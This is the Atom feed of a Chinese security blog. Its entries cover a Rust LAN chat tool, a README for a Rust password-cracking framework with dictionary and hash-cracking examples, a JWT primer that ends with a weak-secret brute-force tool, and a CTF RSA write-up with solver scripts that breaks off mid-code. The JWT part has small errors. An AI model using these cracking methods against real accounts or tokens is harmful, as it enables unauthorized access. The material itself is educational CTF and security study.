<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>真のBLACK</title>
  
  <subtitle>THE HACKER | CTFER | NETWORK SECURITY RESEARCHER</subtitle>
  <link href="https://dxhm.github.io/atom.xml" rel="self"/>
  
  <link href="https://dxhm.github.io/"/>
  <updated>2023-07-19T08:42:11.100Z</updated>
  <id>https://dxhm.github.io/</id>
  
  <author>
    <name>真のBLACK</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BLANE - 基于RUST的轻量化局域网通信工具</title>
    <link href="https://dxhm.github.io/2023/07/12/BLANE/"/>
    <id>https://dxhm.github.io/2023/07/12/BLANE/</id>
    <published>2023-07-12T08:06:02.000Z</published>
    <updated>2023-07-19T08:42:11.100Z</updated>
    
    <content type="html"><![CDATA[<p>项目仓库：<a href="https://github.com/DXHM/BLANE">https://github.com/DXHM/BLANE</a></p><h2 id="关于本项目"><a href="#关于本项目" class="headerlink" title="关于本项目"></a>关于本项目</h2><p>此项目立项想法是在某次CTF线下赛(🚄⛰💧☔)后产生的，全球范围内的公共卫生环境的形势严峻，此前参加过的很多CTF以线上赛为主，开放后也是和队友们都第一次参加线下CTF比赛。我的团队由于对赛制缺乏了解和提前准备，对于客场分布情况及影响沟通效率都存在问题。比赛现场禁用互联网并且时间紧迫，也会给团队间的沟通交流，资料共享，协同合作产生很多障碍，耽误很多时间。由此我产生了自己编写一个应用于局域网内实现便捷通信的程序，可以在这种类似的场景下派上用场，先立项搭建个大体框架，不定时更新并将一些功能不断完善进去。</p><ul><li><p>本项目为基于Rust编写的一个局域网聊天工具，用于局域网设备间的日常通讯。</p></li><li><p>采用非对称加密算法进行数据加密传输，可以进行文字通信（支持中&#x2F;英），并具备图片和文件传输功能。</p></li><li><p>该项目旨在为中小型团队成员在局域网内提供一个方便快捷，安全且轻量化的聊天体验。</p></li></ul><p>各位师傅如果什么想法欢迎issue，求关注求star！感谢您的支持，欢迎各位大佬贡献代码，本项目仍处于早期开发阶段，佛系更新。</p><p>欢迎催更，下次一定😋！</p><h2 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h2><ul><li>通过非对称加密算法实现安全通信</li><li>支持中英文文字通信</li><li>图片和文件传输或共享</li><li>在线状态跟踪</li><li>可自定义用户名</li><li>etc..</li></ul><h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><ol><li><p>克隆仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/DXHM/BLANE.git</span><br></pre></td></tr></table></figure></li><li><p>构建项目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> BLANE</span><br><span class="line">cargo build</span><br></pre></td></tr></table></figure></li><li><p>运行服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo run --bin server</span><br></pre></td></tr></table></figure></li><li><p>运行客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo run --bin client</span><br></pre></td></tr></table></figure></li></ol><h2 id="依赖项"><a href="#依赖项" class="headerlink" title="依赖项"></a>依赖项</h2><ul><li>glib-2.0：服务器和客户端 GUI 所需的依赖项（基于 GTK 的界面）</li><li>openssl：用于加密算法</li></ul><h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p><a href="https://github.com/dxhm"><img alt="AShujiao" src="https://avatars.githubusercontent.com/u/69539047?v=4" width="117"></a></p><h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;项目仓库：&lt;a href=&quot;https://github.com/DXHM/BLANE&quot;&gt;https://github.com/DXHM/BLANE&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;关于本项目&quot;&gt;&lt;a href=&quot;#关于本项目&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="github" scheme="https://dxhm.github.io/tags/github/"/>
    
    <category term="tools" scheme="https://dxhm.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>BLACK CRACKER RUSTY</title>
    <link href="https://dxhm.github.io/2023/07/06/BlackCracker-Rusty/"/>
    <id>https://dxhm.github.io/2023/07/06/BlackCracker-Rusty/</id>
    <published>2023-07-06T15:40:39.000Z</published>
    <updated>2023-07-07T17:09:05.181Z</updated>
    
    <content type="html"><![CDATA[<p>最近沉迷于玩Rust，想着用Rust随手写个Web或密码学的工具。</p><p>此项目暂属于半成品，先立个项，有时间了再慢慢研究完善😁……</p><p>欢迎各界大佬贡献智慧，求star，有什么想法欢迎issue讨论，期待能在致谢中能添上您的头像</p><p>LOVE AND PEACE !</p><blockquote><p>此项目是基于 Rust 编写的密码破解框架。</p></blockquote><blockquote><p>集成多种的密码破解功能，包括字典攻击、弱口令检测和哈希破解等功能。</p></blockquote><blockquote><p>etc..</p></blockquote><h1 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h1><p>Github：<a href="https://github.com/DXHM/BlackCracker_Rusty">BlackCracker_Rusty</a><br>最新版本下载：<a href="https://github.com/dxhm/BlackCracker_Rusty/releases/latest">Release</a></p><h2 id="Functionality"><a href="#Functionality" class="headerlink" title="Functionality"></a>Functionality</h2><ul><li><strong>字典攻击模式</strong>：通过遍历字典文件中的密码，尝试破解目标密码。</li><li><strong>弱口令检测模式</strong>：检测目标密码是否为弱口令，进行口令安全性评估。</li><li><strong>哈希破解模式</strong>：通过破解密码哈希值，尝试还原原始密码。</li></ul><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><ol><li><p>克隆项目到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/DXHM/BlackCracker_Rusty.git</span><br></pre></td></tr></table></figure></li><li><p>进入项目目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Blackcracker_rusty</span><br></pre></td></tr></table></figure></li><li><p>构建项目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo build --release</span><br></pre></td></tr></table></figure></li><li><p>运行项目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo run -- &lt;mode&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><ul><li><code>&lt;mode&gt;</code>：选择要运行的模式，可以是 <code>dictionary</code>、<code>weak_password</code> 或 <code>hash_cracker</code>。</li><li><code>&lt;target&gt;</code>：目标密码或哈希值。</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul><li><p>字典攻击模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackcracker_rusty dictionary password123</span><br></pre></td></tr></table></figure></li><li><p>弱密码检测模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackcracker_rusty weak_password user1</span><br></pre></td></tr></table></figure></li><li><p>哈希破解模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackcracker_rusty hash_cracker 5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure></li></ul><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul><li><p>字典攻击模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackcracker_rusty.exe dictionary password123</span><br></pre></td></tr></table></figure></li><li><p>弱密码检测模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackcracker_rusty.exe weak_password user1</span><br></pre></td></tr></table></figure></li><li><p>哈希破解模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackcracker_rusty.exe hash_cracker 5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure></li></ul><h2 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h2><ul><li>rust-crypto &#x3D; “^0.2”</li><li>embed-resource&#x3D;”^2.0”</li></ul><h2 id="Contribution"><a href="#Contribution" class="headerlink" title="Contribution"></a>Contribution</h2><p><a href="https://github.com/dxhm"><img alt="dxhm" src="https://avatars.githubusercontent.com/u/69539047?v=4" width="117"></a></p><h2 id="Licence"><a href="#Licence" class="headerlink" title="Licence"></a>Licence</h2><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近沉迷于玩Rust，想着用Rust随手写个Web或密码学的工具。&lt;/p&gt;
&lt;p&gt;此项目暂属于半成品，先立个项，有时间了再慢慢研究完善😁……&lt;/p&gt;
&lt;p&gt;欢迎各界大佬贡献智慧，求star，有什么想法欢迎issue讨论，期待能在致谢中能添上您的头像&lt;/p&gt;
&lt;p&gt;LOVE</summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="github" scheme="https://dxhm.github.io/tags/github/"/>
    
    <category term="tools" scheme="https://dxhm.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>JWT - Json Web Token</title>
    <link href="https://dxhm.github.io/2023/06/04/JsonWebToken/"/>
    <id>https://dxhm.github.io/2023/06/04/JsonWebToken/</id>
    <published>2023-06-03T19:03:55.000Z</published>
    <updated>2023-06-30T10:46:53.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h1><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h1 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h1><p>JWT由三部分组成，它们之间用圆点.连接<br><img src="/img/JsonWebToken/79625522ba6b45c0a1bfbdecfbd9c4f2.png" alt="e4618556f211ee5fc2842dcde0e99b12.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、Header--&gt;头部</span><br><span class="line">2、Payload--&gt;负载</span><br><span class="line">3、Signature  --&gt;签名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拼接组成JWT：Header.Payload.Signature</span><br></pre></td></tr></table></figure><ul><li><a href="https://jwt.io/#encoded-jwt">在线解密工具1</a></li><li><a href="https://tooltt.com/jwt-decode/">在线解密工具2</a></li></ul><ol><li><p>Header：alg和typ</p> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alg<span class="punctuation">:</span> ALGORITHM<span class="comment">//算法名称</span></span><br><span class="line">typ：TOKEN TYPE<span class="comment">//token类型</span></span><br></pre></td></tr></table></figure> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>Payload（有效载荷）：用来存放实际需要传递的数据</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. Registered claims （标准中注册的声明） </span><br><span class="line">JWT 规定了7个官方字段，这些是一组预定义的claims，非强制性的，供选用。</span><br><span class="line">iss (issuer)：签发人</span><br><span class="line">exp (expiration time)：过期时间</span><br><span class="line">sub (subject)：主题</span><br><span class="line">aud (audience)：受众</span><br><span class="line">nbf (Not Before)：生效时间</span><br><span class="line">iat (Issued At)：签发时间</span><br><span class="line">jti (JWT ID)：编号</span><br><span class="line">2. Public claims （公共的声明）</span><br><span class="line">可以随意定义。自定义claims，注意不要和JWT注册表中属性冲突，这里可以查看JWT注册表。</span><br><span class="line">3.Private claims （私有的声明）</span><br><span class="line">这些是自定义的claims，用于在同意使用这些claims的各方之间共享信息，它们既不是Registered claims，也不是Public claims。</span><br></pre></td></tr></table></figure> <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="number">12356</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="comment">//主题</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span><span class="comment">//自定义私有字段名字</span></span><br><span class="line"><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">12312312</span><span class="comment">//签发时间</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>Signature（签名）：对前两部分的签名，防止数据篡改</p><ul><li>三部分base64编码后用<code>.</code>拼接</li><li>提供一个密钥（secret）用Header所规定的算法加密，形成新的字符串 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">base64UrlEncode(header)+<span class="string">&quot;.&quot;</span>+</span><br><span class="line">base65UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">your<span class="number">-256</span>-bit-secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="JWT特点"><a href="#JWT特点" class="headerlink" title="JWT特点"></a>JWT特点</h1></li></ul><ol><li>JWT 默认是不加密，但也是可以加密的。</li><li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li><li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li><li>JWT 签发了，在到期之前就会始终有效，因为服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或更改 token 的权限。</li><li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。</li><li>JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li></ol></li></ol><h1 id="弱密钥爆破payload"><a href="#弱密钥爆破payload" class="headerlink" title="弱密钥爆破payload"></a>弱密钥爆破payload</h1><ul><li>工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">JWT cracker</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#usage</span><br><span class="line">docker build . -t jwtcrack xxxxxxxxxxxxxx.xxxxxxxx.xxxxx</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JWT简介&quot;&gt;&lt;a href=&quot;#JWT简介&quot; class=&quot;headerlink&quot; title=&quot;JWT简介&quot;&gt;&lt;/a&gt;JWT简介&lt;/h1&gt;&lt;p&gt;Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RF</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
    <category term="json" scheme="https://dxhm.github.io/tags/json/"/>
    
  </entry>
  
  <entry>
    <title>【WP】The 3rd CTF for CDUT DinoTeam</title>
    <link href="https://dxhm.github.io/2022/11/20/cdutDino3wp/"/>
    <id>https://dxhm.github.io/2022/11/20/cdutDino3wp/</id>
    <published>2022-11-19T17:59:21.000Z</published>
    <updated>2023-06-30T10:33:29.514Z</updated>
    
    <content type="html"><![CDATA[<p>备考期间还忙里偷闲，不请自来瞎掺和一脚恐龙的校赛，拿了好几个一血被狠狠地爽到了（）！</p><p>刘师傅听我说谢谢你，因为有你温暖了四季！😋😋</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Can-can-need-p"><a href="#Can-can-need-p" class="headerlink" title="Can can need p"></a>Can can need p</h2><p><img src="/img/cdutDino3wp/cba2a9386f674c8b7987b61c64217271.png"></p><h3 id="task-py"><a href="#task-py" class="headerlink" title="task.py"></a>task.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">20</span>))</span><br><span class="line">    prefix = s[:<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(xxxx + %s) == %s &quot;</span> %</span><br><span class="line">          (s[<span class="number">4</span>:], hashlib.sha256(s.encode()).hexdigest()))</span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&quot;Give me xxxx:&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ans) == <span class="number">4</span> <span class="keyword">and</span> ans == prefix:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">UNKNOWN_BITS = <span class="number">209</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    m = bytes_to_long(flag.encode())</span><br><span class="line">    p = getPrime(BITS)</span><br><span class="line">    q = getPrime(BITS)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&quot;Give me flag:&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> ans == flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Cheater!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;But can I help you with some part of p?&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. Yes, can, can, need!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. No, thank you.&quot;</span>)</span><br><span class="line">    opt = <span class="built_in">input</span>().strip()</span><br><span class="line">    <span class="keyword">if</span> opt == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(p &gt;&gt; UNKNOWN_BITS)</span><br><span class="line">        ans = <span class="built_in">input</span>(<span class="string">&quot;Now give me flag:&quot;</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> ans == flag:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bye&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">4</span>))</span><br><span class="line">p2=p+<span class="string">&quot;pQCyZx63PwzAqvn1&quot;</span></span><br><span class="line">s = hashlib.sha256(p2.encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> s!=<span class="string">&quot;c46336b53554bc39b3bc63aad4474a4ab714039dab35f77595e7f5e5060e6636&quot;</span>:</span><br><span class="line">    p = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">4</span>))</span><br><span class="line">    p2=p+<span class="string">&quot;pQCyZx63PwzAqvn1&quot;</span></span><br><span class="line">    s = hashlib.sha256(p2.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># s = &quot;&quot;.join(random.sample(string.ascii_letters + string.digits, 4))</span></span><br><span class="line">    <span class="comment"># prefix = s[:4]</span></span><br><span class="line">    <span class="comment"># hashlib.sha256(s.encode()).hexdigest()</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><h3 id="exp2：求p"><a href="#exp2：求p" class="headerlink" title="exp2：求p"></a>exp2：求p</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n =<span class="number">82212254497904947665149102513251405705479967930009481859905256645581626201426522544604397443256577540757570698901154519712601424569578579724704032952003372427544379650204925510411735586757460620658423602786408830706374024321117921997478547757745751221661535934681818365428789289484990903284626922746096723797</span></span><br><span class="line">p4=<span class="number">10345341890692903415019083428257191470120154024503374064162101187141047480401937826546305014</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">    p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;n: &quot;</span>, n)   </span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;p: &quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;q: &quot;</span>, n/p)</span><br></pre></td></tr></table></figure><h3 id="exp3：解m"><a href="#exp3：解m" class="headerlink" title="exp3：解m"></a>exp3：解m</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">4</span>))</span><br><span class="line">p2=p+<span class="string">&quot;rdPhgxVFpGKu3QWA&quot;</span></span><br><span class="line">s = hashlib.sha256(p2.encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> s!=<span class="string">&quot;0e4f516f8b205ce622643b138465df283b873c5dd7e571e72782a3be3dfb113d&quot;</span>:</span><br><span class="line">    p = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">4</span>))</span><br><span class="line">    p2=p+<span class="string">&quot;rdPhgxVFpGKu3QWA&quot;</span></span><br><span class="line">    s = hashlib.sha256(p2.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># s = &quot;&quot;.join(random.sample(string.ascii_letters + string.digits, 4))</span></span><br><span class="line">    <span class="comment"># prefix = s[:4]</span></span><br><span class="line">    <span class="comment"># hashlib.sha256(s.encode()).hexdigest()</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><h3 id="exp4：解flag"><a href="#exp4：解flag" class="headerlink" title="exp4：解flag"></a>exp4：解flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 